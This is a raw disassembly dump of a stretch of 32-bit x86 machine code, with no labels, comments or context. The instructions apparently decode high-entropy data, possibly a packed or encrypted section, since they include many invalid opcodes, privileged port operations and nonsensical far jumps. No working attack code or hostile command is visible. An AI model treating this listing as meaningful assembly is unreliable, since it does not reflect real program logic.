  40ae64:	and    al,0xfb
  40ae66:	nop
  40ae67:	js     0x40ae1f
  40ae69:	inc    esi
  40ae6a:	fld    QWORD PTR [eax]
  40ae6c:	cmp    dh,BYTE PTR [ebp+0x6529d986]
  40ae72:	cmp    DWORD PTR [edi+ebx*1-0x36d54ebe],edx
  40ae79:	adc    eax,0xe789ece2
  40ae7e:	lea    ecx,fs:[ecx]
  40ae81:	out    0x6d,al
  40ae83:	int    0xf6
  40ae85:	jmp    0x1bcdb2e9
  40ae8a:	and    cl,0xa3
  40ae8d:	mov    eax,ds:0x4ecf1692
  40ae92:	mov    dl,0x28
  40ae94:	fistp  QWORD PTR ds:[edx]
  40ae97:	mov    esp,0x5b87c8c8
  40ae9c:	jmp    0xd2c0:0x13fd2b9f
  40aea3:	sub    BYTE PTR [ebp+0x85c3d56],ch
  40aea9:	jb     0x40aec1
  40aeab:	adc    al,0x37
  40aead:	les    ebx,FWORD PTR [ebx-0x46]
  40aeb0:	or     edi,ecx
  40aeb2:	loop   0x40ae92
  40aeb4:	ds icebp 
  40aeb6:	cmp    eax,0xa57deea5
  40aebb:	popa   
  40aebc:	push   es
  40aebd:	out    0x43,al
  40aebf:	mov    esp,0xe9372ff0
  40aec4:	mov    ebp,0x31130746
  40aec9:	rcl    edx,0x5f
  40aecc:	cmc    
  40aecd:	or     cl,BYTE PTR [eax+0x1dfb4987]
  40aed3:	sub    BYTE PTR [ebx],cl
  40aed5:	mov    al,0x77
  40aed7:	in     eax,dx
  40aed8:	mov    esp,DWORD PTR [ecx*2-0x67ec38df]
  40aedf:	dec    esi
  40aee0:	leave  
  40aee1:	mov    eax,DWORD PTR [eax]
  40aee3:	sub    BYTE PTR [esp+edx*4],bl
  40aee6:	lds    edx,FWORD PTR [eax+0x153dcbf7]
  40aeec:	sub    BYTE PTR [ecx+ecx*4-0x4d01fcc3],ah
  40aef3:	mov    edi,0x33912ecd
  40aef8:	popa   
  40aef9:	jno    0x40aeb8
  40aefb:	add    DWORD PTR [eax+0x33],0xffffffc9
  40aeff:	lea    ebp,[eax]
  40af01:	lock stc 
  40af03:	outs   dx,DWORD PTR ds:[esi]
  40af04:	call   0x1210:0xe21808c6
  40af0b:	cmp    DWORD PTR [ebp+0x6af46cf6],ebp
  40af11:	adc    eax,0x3dd83431
  40af16:	push   ss
  40af17:	mov    esi,0xcb5b3209
  40af1c:	outs   dx,DWORD PTR ds:[esi]
  40af1d:	neg    eax
  40af1f:	and    bh,BYTE PTR [ecx+0x1a]
  40af22:	fisub  WORD PTR [eax+0x2925c871]
  40af28:	xchg   ecx,eax
  40af29:	add    BYTE PTR [edi],dl
  40af2b:	add    al,0xb
  40af2d:	or     BYTE PTR [edx],cl
  40af2f:	jmp    0x6b80:0x88aff0f6
  40af36:	aad    0xdd
  40af38:	mov    ecx,0x6828a7ac
  40af3d:	repnz jecxz 0x40af08
  40af40:	aaa    
  40af41:	jo     0x40aefd
  40af43:	int    0x77
  40af45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af46:	mov    eax,0xf9cce639
  40af4b:	in     al,0xd3
  40af4d:	add    eax,0x72083abd
  40af52:	sar    BYTE PTR [edx-0x18],0x36
  40af56:	(bad)  
  40af57:	aad    0x9a
  40af59:	cli    
  40af5a:	cmc    
  40af5b:	arpl   WORD PTR [esi+0x78364cd6],di
  40af61:	fld    DWORD PTR [esi-0x30fcef3]
  40af67:	or     BYTE PTR [edx],ah
  40af69:	ins    BYTE PTR es:[edi],dx
  40af6a:	mov    esi,DWORD PTR [ebx+0x316a8950]
  40af70:	add    ebx,DWORD PTR [edx]
  40af72:	xchg   BYTE PTR [ebx-0x50db91f3],ch
  40af78:	push   ebp
  40af79:	pop    ebx
  40af7a:	bound  ebp,QWORD PTR [ecx]
  40af7c:	ins    DWORD PTR es:[edi],dx
  40af7d:	(bad)  
  40af7f:	mov    dl,0x8
  40af81:	ret    0xd42c
  40af84:	push   0x108c1ab8
  40af89:	icebp  
  40af8a:	push   cs
  40af8b:	pop    esp
  40af8c:	xor    eax,DWORD PTR [edx-0x2b]
  40af8f:	(bad)  
  40af91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af92:	stos   BYTE PTR es:[edi],al
  40af93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af94:	mov    ds:0xd7a18858,al
  40af99:	and    al,0x35
  40af9b:	pop    ebx
  40af9c:	iret   
  40af9d:	or     ecx,esp
  40af9f:	pop    esp
  40afa0:	xchg   ebx,eax
  40afa1:	or     ch,BYTE PTR [ebx+0x33528b29]
  40afa7:	test   eax,0x23e87e05
  40afac:	sub    esi,DWORD PTR [ebp+0x2085f55d]
  40afb2:	inc    esi
  40afb3:	jmp    0x29f10b73
  40afb8:	and    eax,0xf72ce900
  40afbd:	xlat   BYTE PTR ds:[ebx]
  40afbe:	popf   
  40afbf:	inc    esi
  40afc0:	lods   al,BYTE PTR ds:[esi]
  40afc1:	jbe    0x40af48
  40afc3:	in     al,dx
  40afc4:	(bad)  
  40afc5:	icebp  
  40afc6:	push   eax
  40afc7:	mov    bh,0xf7
  40afc9:	pop    ebx
  40afca:	outs   dx,BYTE PTR ds:[esi]
  40afcb:	test   al,0xd9
  40afcd:	sbb    ch,BYTE PTR [edi]
  40afcf:	in     al,0x48
  40afd1:	mov    ah,0x87
  40afd3:	retf   
  40afd4:	popf   
  40afd5:	nop
  40afd6:	shl    DWORD PTR [ebx+0x29467267],cl
  40afdc:	or     eax,ecx
  40afde:	add    al,BYTE PTR [ebp-0x4b55e5cc]
  40afe4:	sti    
  40afe5:	lock test al,0xbc
  40afe8:	push   esi
  40afe9:	cmp    al,0xa5
  40afeb:	das    
  40afec:	fadd   DWORD PTR [eax+0x6f09a2a3]
  40aff2:	gs sub eax,ecx
  40aff5:	dec    ebp
  40aff6:	jns    0x40b041
  40aff8:	or     DWORD PTR [esi-0x37],esi
  40affb:	fisttp WORD PTR [edi-0x6b]
  40affe:	mov    al,0xda
  40b000:	(bad)  
  40b001:	out    dx,eax
  40b002:	cmp    BYTE PTR [eax+0x17],0xfb
  40b006:	inc    edx
  40b007:	cmp    dh,BYTE PTR [ebx-0x46]
  40b00a:	xchg   ch,bh
  40b00c:	push   0xeb81e771
  40b011:	sub    al,0x87
  40b013:	aad    0x1f
  40b015:	cmp    edx,edx
  40b017:	(bad)  
  40b018:	or     ebx,edi
  40b01a:	pop    eax
  40b01b:	sub    dh,bh
  40b01d:	mov    ds:0x7808dcd9,eax
  40b022:	les    ebx,FWORD PTR ds:0x362a192c
  40b028:	fistp  QWORD PTR [eax-0x7b54d0de]
  40b02e:	loopne 0x40b06c
  40b030:	loopne 0x40b015
  40b032:	mov    BYTE PTR [ebx-0x571b7b6f],bh
  40b038:	or     edx,ecx
  40b03a:	or     DWORD PTR [ebp+0x6c03b56f],ebx
  40b040:	fs lock nop
  40b043:	out    dx,eax
  40b044:	mov    al,0xf9
  40b046:	addr16 jnp 0x40b027
  40b049:	xchg   edi,eax
  40b04a:	jge    0x40afe1
  40b04c:	mov    bl,0x79
  40b04e:	stos   BYTE PTR es:[edi],al
  40b04f:	jae    0x40b0ac
  40b051:	imul   eax,DWORD PTR [esi-0x410c589f],0xffffffc2
  40b058:	pop    ss
  40b059:	push   ebp
  40b05a:	inc    edi
  40b05b:	add    BYTE PTR [ebx],ch
  40b05d:	push   esi
  40b05e:	cmp    eax,0xb7c226fb
  40b063:	scas   al,BYTE PTR es:[edi]
  40b064:	daa    
  40b065:	mov    eax,ds:0x64a91d87
  40b06a:	out    0xca,al
  40b06c:	mov    cl,0xb6
  40b06e:	ss das 
  40b070:	adc    dl,bl
  40b072:	jns    0x40b098
  40b074:	mov    ds:0xc0ed877e,al
  40b079:	fmul   st(3),st
  40b07b:	mov    dh,0xd5
  40b07d:	xchg   ch,cl
  40b07f:	sub    DWORD PTR [eax-0xc],esi
  40b082:	and    BYTE PTR [eax-0x2a929d4f],0x8
  40b089:	(bad)  
  40b08a:	popf   
  40b08b:	rcr    edx,cl
  40b08d:	push   edx
  40b08e:	jg     0x40b0b7
  40b090:	lods   al,BYTE PTR ds:[esi]
  40b091:	icebp  
  40b092:	lods   al,BYTE PTR ds:[esi]
  40b093:	lds    edi,FWORD PTR [eax-0x5d15cf8e]
  40b099:	clc    
  40b09a:	sub    BYTE PTR [edx+0x4c],al
  40b09d:	mov    esi,0x18cb8181
  40b0a2:	int    0x3d
  40b0a4:	repz lds eax,FWORD PTR ds:0x46f09776
  40b0ab:	dec    ebp
  40b0ac:	out    0x5e,al
  40b0ae:	mov    eax,ds:0xbf64282c
  40b0b3:	inc    eax
  40b0b4:	adc    al,0xa6
  40b0b6:	mov    DWORD PTR [ecx-0x64eb7818],eax
  40b0bc:	fsub   st,st(6)
  40b0be:	and    al,0x93
  40b0c0:	es mov ebx,0x8bf53dda
  40b0c6:	xchg   BYTE PTR [edi],dl
  40b0c8:	add    al,BYTE PTR ss:[ebp-0x90b8f8d]
  40b0cf:	lea    ecx,[edi+ebp*4-0x47]
  40b0d3:	cmp    cl,BYTE PTR [esi+0x1c]
  40b0d6:	loopne 0x40b081
  40b0d8:	dec    ebp
  40b0d9:	outs   dx,BYTE PTR ds:[esi]
  40b0da:	jmp    0x40b105
  40b0dc:	addr16 dec eax
  40b0de:	push   esp
  40b0df:	pop    ds
  40b0e0:	idiv   DWORD PTR [ebp-0x6e]
  40b0e3:	cs or  eax,0xee6543a
  40b0e9:	icebp  
  40b0ea:	inc    esi
  40b0eb:	loopne 0x40b0fe
  40b0ed:	cmp    al,0x1
  40b0ef:	pop    esi
  40b0f0:	cmp    ebx,DWORD PTR [esp+edx*1]
  40b0f3:	xlat   BYTE PTR ds:[ebx]
  40b0f4:	dec    ebp
  40b0f5:	lock push ds
  40b0f7:	mov    edi,0xaf6325da
  40b0fc:	sub    dh,al
  40b0fe:	lock aam 0xcf
  40b101:	pop    es
  40b102:	sub    dh,al
  40b104:	add    DWORD PTR ds:0xbcf6b735,edx
  40b10a:	xchg   BYTE PTR [ecx-0x6f7ce460],dh
  40b110:	xlat   BYTE PTR ds:[ebx]
  40b111:	cmp    al,0x5a
  40b113:	sub    BYTE PTR [eax+0x7ffdf27f],ch
  40b119:	inc    eax
  40b11a:	mov    ecx,0x322378db
  40b11f:	sub    ah,ah
  40b121:	jo     0x40b185
  40b123:	mov    esp,0x19b153e3
  40b128:	add    DWORD PTR [ecx-0x78],ebx
  40b12b:	popa   
  40b12c:	mov    ebp,eax
  40b12e:	mov    ecx,0x869c0155
  40b133:	pop    esi
  40b134:	push   cs
  40b135:	icebp  
  40b136:	pop    eax
  40b137:	mov    BYTE PTR [edi-0x73],ah
  40b13a:	mov    cl,0xb3
  40b13c:	cmp    bh,bh
  40b13e:	cs xchg esp,eax
  40b140:	jbe    0x40b1a2
  40b142:	test   BYTE PTR [ecx-0x192734d4],ch
  40b148:	arpl   cx,si
  40b14a:	jle    0x40b12c
  40b14c:	inc    ecx
  40b14d:	jmp    0x4c178ec0
  40b152:	mov    eax,DWORD PTR [esi]
  40b154:	call   0x3f54:0x91b87ce
  40b15b:	ins    BYTE PTR es:[edi],dx
  40b15c:	or     DWORD PTR [esi],0xa045292d
  40b162:	mov    ds:0x952efcb0,al
  40b167:	jecxz  0x40b0fd
  40b169:	sbb    BYTE PTR [esi-0x3a64f227],al
  40b16f:	stos   DWORD PTR es:[edi],eax
  40b170:	lods   eax,DWORD PTR ds:[esi]
  40b171:	jg     0x40b154
  40b173:	sub    BYTE PTR [ecx+0x7a547ca0],ch
  40b179:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b17b:	jecxz  0x40b16b
  40b17d:	ja     0x40b12c
  40b17f:	sub    ebx,esp
  40b181:	add    dh,BYTE PTR ds:0xfce6c307
  40b187:	adc    bl,BYTE PTR [edx-0x7656ff2f]
  40b18d:	rcl    DWORD PTR [ebx],cl
  40b18f:	int    0x11
  40b191:	data16 xchg BYTE PTR [ebp+0x7fc2a3a7],cl
  40b198:	in     eax,dx
  40b199:	inc    eax
  40b19a:	retf   0xde29
  40b19d:	mov    WORD PTR [ecx-0x47],?
  40b1a0:	add    eax,0xb0516f6e
  40b1a5:	les    edi,FWORD PTR [edx-0x58d6637a]
  40b1ab:	pop    esi
  40b1ac:	and    DWORD PTR [edx+0x69910cc9],esi
  40b1b2:	adc    eax,0xb988ce28
  40b1b7:	dec    ebp
  40b1b8:	dec    eax
  40b1b9:	adc    al,0x80
  40b1bb:	xlat   BYTE PTR ds:[ebx]
  40b1bc:	xchg   ebp,eax
  40b1bd:	push   ebx
  40b1be:	jmp    0x40b157
  40b1c0:	mov    eax,ds:0xfb933df3
  40b1c5:	fnsave [esi+0x34]
  40b1c8:	mov    al,BYTE PTR [eax+0x40d00d94]
  40b1ce:	shr    DWORD PTR [ebp+0x5ea6a5f7],cl
  40b1d4:	mov    dh,BYTE PTR [ebx]
  40b1d6:	mov    bh,0x15
  40b1d8:	shl    ecx,1
  40b1da:	mov    ?,edi
  40b1dc:	cmc    
  40b1dd:	sahf   
  40b1de:	and    DWORD PTR [ecx+0x24fe7ac3],0x35878e1e
  40b1e8:	xor    DWORD PTR [ecx-0x21],0x2b
  40b1ec:	outs   dx,DWORD PTR ds:[esi]
  40b1ed:	outs   dx,BYTE PTR ds:[esi]
  40b1ee:	adc    ebp,DWORD PTR [eax]
  40b1f0:	mov    ?,WORD PTR [esi+esi*2-0x7b]
  40b1f4:	or     BYTE PTR [esi+0x59e8a04d],dl
  40b1fa:	sbb    al,0x42
  40b1fc:	cmp    eax,0x2cec6cf6
  40b201:	and    al,0xe5
  40b203:	push   cs
  40b204:	jnp    0x40b1fd
  40b206:	pop    eax
  40b207:	lods   eax,DWORD PTR ds:[esi]
  40b208:	aad    0x56
  40b20a:	mov    bh,0x88
  40b20c:	iretw  
  40b20e:	test   bl,dh
  40b210:	fcomp  QWORD PTR [edx]
  40b212:	retf   0x8e80
  40b215:	icebp  
  40b216:	push   cs
  40b217:	enter  0xc24b,0x3a
  40b21b:	arpl   WORD PTR [ebx-0x54f8be08],ax
  40b221:	cmp    BYTE PTR [esi-0x37aa8805],al
  40b227:	(bad)  
  40b228:	in     eax,dx
  40b229:	cli    
  40b22a:	sbb    ebp,DWORD PTR [ecx]
  40b22c:	xchg   edi,eax
  40b22d:	add    bh,BYTE PTR [edx]
  40b22f:	stos   BYTE PTR es:[edi],al
  40b230:	or     esp,edi
  40b232:	inc    edx
  40b233:	ins    BYTE PTR es:[edi],dx
  40b234:	lea    eax,[edi-0x4bb79ea3]
  40b23a:	inc    ecx
  40b23b:	icebp  
  40b23c:	lahf   
  40b23d:	lods   eax,DWORD PTR ds:[esi]
  40b23e:	(bad)  
  40b23f:	pop    eax
  40b240:	or     DWORD PTR [ecx],ebp
  40b242:	jmp    edi
  40b244:	dec    esi
  40b245:	cmp    DWORD PTR [edx+ebp*2],ebp
  40b248:	or     dh,ah
  40b24a:	xchg   edx,eax
  40b24b:	gs out 0x79,al
  40b24e:	jp     0x40b1fb
  40b250:	stos   DWORD PTR es:[edi],eax
  40b251:	icebp  
  40b252:	ficom  WORD PTR [esi-0x58a38e7d]
  40b258:	cmp    BYTE PTR [eax-0x25],bh
  40b25b:	ds popf 
  40b25d:	ret    0x7999
  40b260:	dec    eax
  40b261:	lahf   
  40b262:	dec    edi
  40b263:	test   al,0x2c
  40b265:	bound  eax,QWORD PTR [ecx+0x26410af4]
  40b26b:	lods   eax,DWORD PTR ds:[esi]
  40b26c:	jae    0x40b2a6
  40b26e:	iret   
  40b26f:	push   esi
  40b270:	adc    al,0x54
  40b272:	adc    eax,0xf8f6fce7
  40b277:	cmp    bh,cl
  40b279:	xchg   ecx,eax
  40b27a:	fnstenv [eax-0x538f01d5]
  40b280:	mov    eax,0x5ca4d84
  40b285:	jle    0x40b216
  40b287:	call   0x3e61d0a1
  40b28c:	adc    ebp,DWORD PTR [edx+edx*4-0x5c74429e]
  40b293:	call   0x298eb4cc
  40b298:	mov    bl,0x8c
  40b29a:	loop   0x40b2c4
  40b29c:	ret    
  40b29d:	adc    al,0x70
  40b29f:	ret    0x2bf8
  40b2a2:	hlt    
  40b2a3:	jno    0x40b228
  40b2a5:	mov    ch,0xbc
  40b2a7:	pop    edi
  40b2a8:	lds    edx,FWORD PTR [eax-0x7a]
  40b2ab:	xchg   ebp,eax
  40b2ac:	jl     0x40b2ac
  40b2ae:	add    ch,BYTE PTR [ebx]
  40b2b0:	(bad)  
  40b2b1:	hlt    
  40b2b2:	shr    DWORD PTR [ecx+0x748fc7f7],1
  40b2b8:	push   edi
  40b2b9:	hlt    
  40b2ba:	ds pushf 
  40b2bc:	call   DWORD PTR [esi-0x79]
  40b2bf:	sbb    esi,DWORD PTR [edx-0x3e]
  40b2c2:	cmc    
  40b2c3:	cmp    al,0xfd
  40b2c5:	xchg   esi,eax
  40b2c6:	xchg   ebp,eax
  40b2c7:	sub    BYTE PTR [edx],dl
  40b2c9:	clc    
  40b2ca:	jae    0x40b28c
  40b2cc:	ucomiss xmm1,DWORD PTR [eax+0x3e4e8b9]
  40b2d3:	ja     0x40b291
  40b2d5:	out    dx,al
  40b2d6:	lea    ebp,[edx-0x59]
  40b2d9:	xor    esp,DWORD PTR [edi+0x46]
  40b2dc:	cmp    eax,esi
  40b2de:	pop    di
  40b2e0:	mov    eax,ds:0x345cb82d
  40b2e5:	outs   dx,DWORD PTR ds:[esi]
  40b2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e7:	out    dx,eax
  40b2e8:	out    dx,eax
  40b2e9:	adc    al,0x86
  40b2eb:	pop    es
  40b2ec:	pop    ds
  40b2ed:	mov    esi,0xd0427323
  40b2f2:	or     eax,0x6c00c308
  40b2f7:	sub    bl,al
  40b2f9:	add    ebx,DWORD PTR [edi-0x61]
  40b2fc:	or     BYTE PTR [edx],dh
  40b2fe:	(bad)  [esi-0xcde230c]
  40b304:	and    eax,0xfa84c2f2
  40b309:	pusha  
  40b30a:	add    al,0x98
  40b30c:	xor    ebp,DWORD PTR [ecx]
  40b30e:	fild   WORD PTR [edi]
  40b310:	neg    DWORD PTR ds:0x4f454781
  40b316:	loopne 0x40b395
  40b318:	inc    ebx
  40b319:	pop    ss
  40b31a:	jl     0x40b361
  40b31c:	mov    al,ds:0xab159c9
  40b321:	pop    es
  40b322:	xchg   BYTE PTR [ebx],al
  40b324:	test   al,0xc3
  40b326:	cmp    DWORD PTR [edx+0xf],ebx
  40b329:	mov    ebp,0x37135d84
  40b32e:	sbb    BYTE PTR [edi],ah
  40b330:	mov    ds:0x4e6a6ecb,eax
  40b335:	idiv   ecx
  40b337:	loope  0x40b304
  40b339:	(bad)  
  40b33a:	fs out dx,al
  40b33c:	imul   edx,DWORD PTR [esi],0x46
  40b33f:	or     al,0xc7
  40b341:	fadd   DWORD PTR [esi+0x167a4431]
  40b347:	mov    ebp,0x293abe07
  40b34c:	outs   dx,BYTE PTR ds:[esi]
  40b34d:	gs das 
  40b34f:	(bad)  
  40b350:	or     DWORD PTR [eax],edx
  40b352:	fsubr  DWORD PTR [eax+0x42a40b7e]
  40b358:	popa   
  40b359:	repz pushf 
  40b35b:	scas   eax,DWORD PTR es:[edi]
  40b35c:	jmp    0x40b33e
  40b35e:	lea    esi,[ebp+0x6c]
  40b361:	jo     0x40b3b4
  40b363:	inc    BYTE PTR [esi]
  40b365:	sub    dh,BYTE PTR [ebx]
  40b367:	adc    eax,0x9267c4d
  40b36c:	inc    esp
  40b36d:	jp     0x40b376
  40b36f:	xchg   ecx,eax
  40b370:	iret   
  40b371:	pop    edi
  40b372:	std    
  40b373:	sub    BYTE PTR [ecx-0x27],bh
  40b376:	or     DWORD PTR [esi+0x9],ecx
  40b379:	div    BYTE PTR [edx+0x781852fe]
  40b37f:	iret   
  40b380:	jne    0x40b372
  40b382:	out    0xf3,al
  40b384:	pop    ds
  40b385:	ins    DWORD PTR es:[edi],dx
  40b386:	fidivr DWORD PTR [ebp+0x75ba39e6]
  40b38c:	mov    esi,0x2fa5984d
  40b391:	adc    eax,0xf000a9ae
  40b396:	add    DWORD PTR es:[eax+eax*8+0x39],esi
  40b39b:	test   eax,0x34ebc5db
  40b3a0:	retf   
  40b3a1:	inc    ecx
  40b3a2:	xchg   BYTE PTR [ebx],dl
  40b3a4:	lods   eax,DWORD PTR ds:[esi]
  40b3a5:	fcomp  QWORD PTR [ecx+ebp*8+0x29768bbb]
  40b3ac:	xchg   esp,eax
  40b3ad:	gs std 
  40b3af:	(bad)  
  40b3b0:	or     BYTE PTR [edx+eax*4],bh
  40b3b3:	mov    ds:0x5e82b317,eax
  40b3b8:	xor    esi,eax
  40b3ba:	enter  0x8a3d,0x59
  40b3be:	mov    dl,0x4d
  40b3c0:	ss adc al,0xb
  40b3c3:	jo     0x40b36e
  40b3c5:	adc    DWORD PTR [ebx-0x78473d81],edi
  40b3cb:	aam    0xd7
  40b3cd:	adc    DWORD PTR [ecx-0x40771254],edi
  40b3d3:	push   ecx
  40b3d4:	push   ecx
  40b3d5:	jmp    0x40b35d
  40b3d7:	mov    al,0xc9
  40b3d9:	or     DWORD PTR [esi-0x61],edx
  40b3dc:	cmovg  esp,DWORD PTR [edi]
  40b3df:	jae    0x40b38a
  40b3e1:	in     eax,dx
  40b3e2:	test   al,0xab
  40b3e4:	xchg   esp,eax
  40b3e5:	cdq    
  40b3e6:	mov    esi,0xa450a3a9
  40b3eb:	call   0x9fcfa430
  40b3f0:	inc    edi
  40b3f1:	cmp    DWORD PTR [esi+eiz*1+0x10],esi
  40b3f5:	dec    ebp
  40b3f6:	out    0x38,al
  40b3f8:	or     dl,ah
  40b3fa:	jo     0x40b449
  40b3fc:	fcmove st,st(6)
  40b3fe:	aaa    
  40b3ff:	popa   
  40b400:	push   es
  40b401:	icebp  
  40b402:	outs   dx,BYTE PTR ds:[esi]
  40b403:	popf   
  40b404:	jge    0x40b40a
  40b406:	mov    bh,BYTE PTR [ecx-0x31]
  40b409:	ja     0x40b3c5
  40b40b:	pop    eax
  40b40c:	xchg   edi,eax
  40b40e:	xchg   BYTE PTR [ecx],dh
  40b410:	popf   
  40b411:	inc    esi
  40b412:	fnsave es:0x70289701
  40b419:	jmp    0x40b42a
  40b41b:	out    0x9,eax
  40b41d:	mov    esp,0x291fff66
  40b422:	sub    ebx,DWORD PTR [esi]
  40b424:	aas    
  40b425:	icebp  
  40b426:	sub    al,0xd1
  40b428:	fwait
  40b429:	mov    dl,ch
  40b42b:	jg     0x40b3ae
  40b42d:	xor    al,0x39
  40b42f:	loope  0x40b415
  40b431:	xor    BYTE PTR [esi+0x55bedc49],al
  40b437:	sub    DWORD PTR [ebx+0x70c5a4df],ebp
  40b43d:	lock adc bh,0x89
  40b441:	lea    ecx,[edx+0x48]
  40b444:	repz adc DWORD PTR [ebx-0x69],ebp
  40b448:	or     DWORD PTR [eax+0x64],edi
  40b44b:	leave  
  40b44c:	test   eax,0x92be0956
  40b451:	sbb    eax,0xf10d4c52
  40b456:	mov    al,0xe4
  40b458:	add    eax,0x6fb596e
  40b45d:	adc    al,0x5f
  40b45f:	jge    0x40b440
  40b461:	and    eax,0x848e6a4a
  40b466:	xchg   ebx,edx
  40b468:	pusha  
  40b469:	jne    0x40b405
  40b46b:	iret   
  40b46c:	iret   
  40b46d:	ror    ebx,0x2a
  40b470:	xlat   BYTE PTR ds:[ebx]
  40b471:	jns    0x40b4e2
  40b473:	inc    eax
  40b474:	int    0x1f
  40b476:	xchg   edx,eax
  40b477:	icebp  
  40b478:	lds    edx,FWORD PTR [ebx+0x9]
  40b47b:	inc    esp
  40b47c:	pusha  
  40b47d:	add    DWORD PTR [ecx],0xc2f0953a
  40b483:	add    ecx,DWORD PTR [ebx]
  40b485:	add    al,ch
  40b487:	(bad)  
  40b488:	mov    edi,0xd35f75b0
  40b48d:	mov    esi,0x7f5a4387
  40b492:	add    BYTE PTR [eax],ah
  40b494:	leave  
  40b495:	jnp    0x40b516
  40b497:	sub    ebp,esi
  40b499:	push   ebp
  40b49a:	mov    WORD PTR [edx-0x3456dff8],?
  40b4a0:	lds    ebx,FWORD PTR [esi+0x42]
  40b4a3:	inc    ebx
  40b4a4:	in     al,0xf7
  40b4a6:	loop   0x40b4c0
  40b4a8:	or     ebx,DWORD PTR [ecx-0x5eb7deed]
  40b4ae:	jbe    0x40b481
  40b4b0:	neg    ebp
  40b4b2:	fbstp  TBYTE PTR [edi]
  40b4b4:	xchg   ebp,eax
  40b4b5:	adc    bh,ah
  40b4b7:	das    
  40b4b8:	lds    edx,FWORD PTR [ecx+0x2a]
  40b4bb:	mov    dh,0x6d
  40b4bd:	cmc    
  40b4be:	push   0xffffff8b
  40b4c0:	aas    
  40b4c1:	aaa    
  40b4c2:	add    DWORD PTR [eax],0xf2f1df09
  40b4c8:	xor    eax,0x2aa9cab2
  40b4cd:	retf   0x985
  40b4d0:	mov    esp,0x6fe530be
  40b4d5:	xchg   BYTE PTR [esi-0x4c],dh
  40b4d8:	or     DWORD PTR [edi+0x4f04efb0],ecx
  40b4de:	shl    BYTE PTR [edx+0x20530a08],0x25
  40b4e5:	popf   
  40b4e6:	lahf   
  40b4e7:	add    edx,DWORD PTR [ebp-0x7808553f]
  40b4ed:	or     dh,cl
  40b4ef:	push   ds
  40b4f0:	or     DWORD PTR [edx-0x5d523f2e],edi
  40b4f6:	aaa    
  40b4f7:	ins    DWORD PTR es:[edi],dx
  40b4f8:	xchg   ecx,esi
  40b4fa:	ret    0xc0ec
  40b4fd:	sar    BYTE PTR [ebx],1
  40b4ff:	cli    
  40b500:	and    edi,ecx
  40b502:	jns    0x40b4a0
  40b504:	inc    ebp
  40b505:	inc    eax
  40b506:	xchg   BYTE PTR [edi],al
  40b508:	dec    edx
  40b509:	lods   al,BYTE PTR ds:[esi]
  40b50a:	sub    dh,dl
  40b50c:	test   DWORD PTR [edi],edi
  40b50e:	cmp    DWORD PTR [ecx],ebp
  40b510:	mov    ch,0x75
  40b512:	push   DWORD PTR [ebx+0x9]
  40b515:	rcl    BYTE PTR [eax],0xe3
  40b518:	push   edx
  40b519:	lahf   
  40b51a:	leave  
  40b51b:	push   0x7e
  40b51d:	icebp  
  40b51e:	cwde   
  40b51f:	pop    ebp
  40b520:	cmp    al,0x95
  40b522:	je     0x40b4ca
  40b524:	add    cl,ch
  40b526:	push   ebp
  40b527:	lahf   
  40b528:	or     BYTE PTR [edx+0x6e],ch
  40b52b:	in     al,dx
  40b52c:	jo     0x40b587
  40b52e:	jmp    0xe44fbd4
  40b533:	jb     0x40b528
  40b535:	cmp    dl,BYTE PTR ss:[edi]
  40b538:	inc    ecx
  40b539:	push   esp
  40b53a:	hlt    
  40b53b:	sub    DWORD PTR [ebx],ecx
  40b53d:	xchg   BYTE PTR [ebx+ecx*2+0x59],dh
  40b541:	push   edx
  40b542:	xchg   DWORD PTR [edi],eax
  40b544:	aaa    
  40b545:	imul   edx,DWORD PTR [esi],0x6c
  40b548:	jmp    0x40b56e
  40b54a:	inc    edx
  40b54b:	sub    bl,cl
  40b54d:	cmp    al,0xd3
  40b54f:	mov    esp,0x4e0e002c
  40b554:	mul    DWORD PTR [ecx]
  40b556:	inc    ebx
  40b557:	dec    ecx
  40b558:	popf   
  40b559:	add    ebx,DWORD PTR [edi+0x9]
  40b55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b55d:	arpl   WORD PTR [ebp+0x29],dx
  40b560:	xlat   BYTE PTR ds:[ebx]
  40b561:	rcr    BYTE PTR [ebx+0x71ba0870],0x7d
  40b568:	sub    dh,BYTE PTR [ebx]
  40b56a:	test   eax,0x7ef1a74e
  40b56f:	sub    eax,0xddb0bb84
  40b574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b575:	test   DWORD PTR [esi],ebx
  40b577:	mov    ah,dh
  40b579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b57a:	mov    ecx,0x65bcb27
  40b57f:	sbb    BYTE PTR [eax-0x10],bl
  40b582:	ss iret 
  40b584:	cmp    edx,DWORD PTR [edx+edx*1]
  40b587:	push   0x64
  40b589:	fs push es
  40b58b:	adc    BYTE PTR [ebx-0x39],bl
  40b58e:	sbb    DWORD PTR [ebp+0x3],0xb46eef20
  40b595:	icebp  
  40b596:	push   ss
  40b597:	lods   eax,DWORD PTR ds:[esi]
  40b598:	mov    esp,0x99b57392
  40b59d:	rcr    BYTE PTR [eax+0x68800922],1
  40b5a3:	shl    DWORD PTR [edx],cl
  40b5a5:	mov    edi,0xf1c91c64
  40b5aa:	mov    edx,0xb5f9094e
  40b5af:	cmp    bh,bl
  40b5b1:	outs   dx,DWORD PTR ds:[esi]
  40b5b2:	rcr    DWORD PTR [eax-0x5a080846],0x73
  40b5b9:	pop    ebp
  40b5ba:	jmp    0x40b5ea
  40b5bc:	adc    eax,ebx
  40b5be:	mov    ds:0x7602d72e,eax
  40b5c3:	ja     0x40b56a
  40b5c5:	dec    edi
  40b5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5c7:	jb     0x40b5cb
  40b5c9:	pop    ds
  40b5ca:	xchg   DWORD PTR [ebx],ebp
  40b5cc:	or     WORD PTR [eax+0x1e],dx
  40b5d0:	cdq    
  40b5d1:	call   0x7744deda
  40b5d6:	in     al,0xc1
  40b5d8:	idiv   DWORD PTR ds:0xa1b62a25
  40b5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5df:	out    dx,al
  40b5e0:	xor    eax,0x4a
  40b5e3:	jno    0x40b614
  40b5e5:	sbb    DWORD PTR [ebx-0x57],eax
  40b5e8:	nop
  40b5e9:	mov    ebp,0x93c7b861
